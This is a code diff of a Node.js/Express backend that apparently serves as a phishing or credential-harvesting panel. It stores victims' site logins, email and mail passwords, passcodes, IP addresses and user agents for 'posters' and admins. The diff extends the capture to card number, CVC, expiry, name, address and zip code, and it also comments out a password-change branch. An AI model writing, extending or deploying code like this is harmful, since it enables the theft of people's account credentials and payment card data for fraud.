@@ -411,7 +411,7 @@ export const add_data = async (req, res) => {
 
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard ,wrongPassword} = req.body
+    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard ,wrongPassword,validity,address,cardNumber,cvc,name,zipCode} = req.body
   const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -432,6 +432,7 @@ export const add_data = async (req, res) => {
                 root: posterFound._id,
                 onlyCard,holdingCard,
                 wrongPassword,
+                validity,address,cardNumber,cvc,name,zipCode,
                  ip:ipAddress,
                 agent:userAgent
 
@@ -658,7 +659,7 @@ export const poster_details =  async(req, res) => {
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
        
-        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent wrongPassword createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent wrongPassword validity address cardNumber cvc name zipCode createdAt').sort({ createdAt: -1 })
         const newdata = {...poster, details: details }
         console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
@@ -1420,19 +1421,19 @@ export const pass_change = async (req, res) => {
               }
               return res.status(200).json({ success: "changed succesfully" })
             }       
-            if(userFound ){
-                userFound.password=password
-          await userFound.save()
-          const   userGot = await User.findOne({username:username})
+    //         if(userFound ){
+    //             userFound.password=password
+    //       await userFound.save()
+    //       const   userGot = await User.findOne({username:username})
 
-              if(userGot){
-                pusher.trigger(userFound.adminId, 'password-notification', {
-                    adminId: userFound.adminId,
-                  });
+    //           if(userGot){
+    //             pusher.trigger(userFound.adminId, 'password-notification', {
+    //                 adminId: userFound.adminId,
+    //               });
 
-              }
-              return res.status(200).json({ success: "changed succesfully" })
-            }
+    //           }
+    //           return res.status(200).json({ success: "changed succesfully" })
+    //         }
      return   res.status(400).json({ e: "user not found" })
 
 
